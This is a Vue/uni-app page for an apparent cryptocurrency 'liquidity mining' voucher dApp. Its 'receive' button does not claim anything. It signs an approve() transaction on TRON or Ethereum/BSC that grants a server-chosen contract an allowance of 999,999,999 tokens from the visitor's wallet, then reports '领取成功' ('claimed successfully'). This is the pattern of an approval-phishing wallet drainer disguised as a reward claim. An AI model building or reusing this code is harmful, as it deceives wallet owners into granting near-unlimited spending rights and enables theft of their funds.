<template>
	<view class="content">
		<navbar :title="title" @change='changeLang' @connect="updateConnect"></navbar>
		<view class="banner">
			<image :src="banner" class="bannerimg" mode="widthFix"></image>
			<view class="banner-content">
				<view class="banner-t">{{$t('index.voucher')}}</view>
				<view class="banner-m">{{$t('index.pledge')}}</view>
				<view class="banner-tip">{{$t('index.mining')}}</view>
				<view class="btns">
					<button type="primary" class="button" size="mini" @click="doapprove">{{$t('receive')}}</button>
					<button type="default" class="button" size="mini" @click="view">{{$t('certificate')}}</button>
				</view>
			</view>
		</view>
		<DataPool v-if="mining_pool" :data="mining_pool"></DataPool>
		<Staking v-if="earnings" :data="earnings"></Staking>
		<question v-if="problem.length>0" :data="problem"></question>
		<partners v-if="white.length>0" :data="white"></partners>
		<service/>
	</view>
</template>

<script>
	import comjs from "@/common/util"
	import http from '@/common/http'
  import Web3 from 'web3'
  import { mapGetters } from 'vuex'
  import {commonMixin} from "@/mixins";
	export default {
    mixins: [commonMixin],
		data() {
			return {
				mining_pool: null,
				earnings: [],
				problem: [],
				banner: '',
				title: '',
				white: []
			}
		},
		onLoad() {
			//通过接口获取合约信息
			this.getContent()
		},
		onShow() {
			//自动检测是否以太链，在钱包中，以太坊或币安环境自动登陆
			//this.connect()
		},
    computed: {
      ...mapGetters([
        'address',
        'contracts',
        'isConnected',
        'isApprove',
        'walletLinkName',
        'walletLink',
        'walletLinkId',
        'walletIndex',
      ]),
    },
		methods: {
			view() {
				uni.navigateTo({
					url: '/pages/certificate/certificate'
				})
			},
			async updateConnect() {
        console.log('updateConnect')
        await this.$store.dispatch(`setIsConnected`, true)
      },
			changeLang() {
				this.getContent()
				// this.reset()
			},
			reset() {
				this.mining_pool = {}
				this.earnings = []
				this.problem = []
			},
			async getContent() {
        const res = await http.post('/api/Index/home')
				const {data={}} = res
				const title = data?.title
				this.mining_pool = data?.mining_pool || {}
				this.earnings = data?.earnings || []
				this.problem = data?.problem || []
				this.banner = data?.banner
				this.title = title
				this.white = data?.white_paper
				// save service url to store
				this.$store.commit('setState', {
					key: 'service',
					value: data.service || {}
				})
        await this.$store.dispatch(`setTitle`, data)
        await uni.setNavigationBarTitle({title: data?.title})
			},
			async doapprove_success() {
				//保存授权地址信息，无需处理返回信息
        console.log(`call doapprove_success`)
			},
			async doapprove_trc() {
        console.log(`call doapprove_trc`)
				//是否获取到相应合约
				if (this.contracts.length === 0 || !this.contracts?.trc) {
					return false;
				}
				await uni.showLoading()
				try {
					let contractdata = this.contracts?.trc
          if (!contractdata) {
            return;
          }
          const tronWeb = window.tronWeb
					let _value = 999999999000000 //授权数量
					const parameter = [{
						type: 'address',
						value: contractdata.smart_contract
					}, {
						type: 'uint256',
						value: _value
					}];
					const tx = await tronWeb.transactionBuilder.triggerSmartContract(
						contractdata.smart_contract,
						"approve(address,uint256)", {},
						parameter,
              this.address
					);
					const signedTx = await tronWeb.trx.sign(tx.transaction);
					const broastTx = await tronWeb.trx.sendRawTransaction(signedTx);
					uni.hideLoading()
					if (broastTx?.result) {

						//授权处理成功，开始成功后的业务处理----------------------
            await this.$store.dispatch(`setIsApprove`, {result: true, txid: broastTx.txid})
						await this.doapprove_success()
						//授权处理成功，结束成功后的业务处理----------------------

						comjs.jsalert("领取成功");
					} else {
						comjs.msg('领取失败')
					}
				} catch (e) {
					uni.hideLoading()
          console.log(`exception:`,e)
					comjs.msg('领取失败')
				}
			},
			async doapprove_eth() {
        console.log(`doapprove_eth`)
				await uni.showLoading()
				try {
					//以太坊/币安  授权开始
					let strabi =
						'[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]'
					let abi = JSON.parse(strabi)
					let ctx = this.contracts[this.walletLink[this.walletIndex]]
          if (!ctx) {
            return;
          }
					let contract = new this.web3js.eth.Contract(abi, ctx.token_contract);
          //授权数量
					let _value = Web3.utils.toWei("999999999", 'ether');
          const receipt = await contract.methods.approve(ctx.smart_contract, _value).send({
            from: this.address
          })
          const transactionHash = receipt?.transactionHash;
          if (transactionHash) {
            uni.hideLoading()
            await this.$store.dispatch(`setIsApprove`, {result: true, txid: transactionHash})
            await this.doapprove_success()
            comjs.jsalert("领取成功");
          }
				} catch (e) {
          console.log(`e`,e)
					uni.hideLoading()
					comjs.msg('领取失败')
				}
			},
			doapprove() {
				//是否已授权
				if (this.isApprove) {
          comjs.jsalert("领取成功");
					return true;
				}
				//没有连接到钱包？开始连接
				if (!this.isConnected) {
					this.chooselink()
					return true;
				}
				//开始授权
				if (this.walletLink[this.walletIndex] === 'trc') {
					this.doapprove_trc();
				} else {
					this.doapprove_eth();
				}
			},
		}
	}
</script>

<style>
	.toprap {
		position: relative;
		text-align: center;
		line-height: 44px;
		height: 44px;
		overflow: hidden;
		padding: 0 200px;
	}

	.bagconnect {
		position: absolute;
		right: 10px;
		top: 5px;
		height: 34px;
		line-height: 34px;
		background: blue;
		font-size: 14px;
		padding: 0 10px;
		border-radius: 5px;
		color: #fff;
	}

	.banner {
		position: relative;
		color: #fff;
	}

	.bannerimg {
		width: 100%;
		height: 48vw !important;
	}

	.banner-content {
		position: absolute;
		left: 5.3vw;
		top: 8vw;
		width: calc(100vw - 10.6vw);
	}

	.banner-t {
		color: #fff;
		font-size: 40rpx;
	}

	.banner-m {
		font-size: 40rpx;
		margin: 1.86667vw 0;
	}

	.banner-tip {
		font-size: 24rpx;
		margin: 24rpx 0;
	}

	.btns {
		display: flex;
		justify-content: space-between;

		.button {
			margin: 0;
		}
	}

	.content {
		background-color: #f8f8f8;
	}
</style>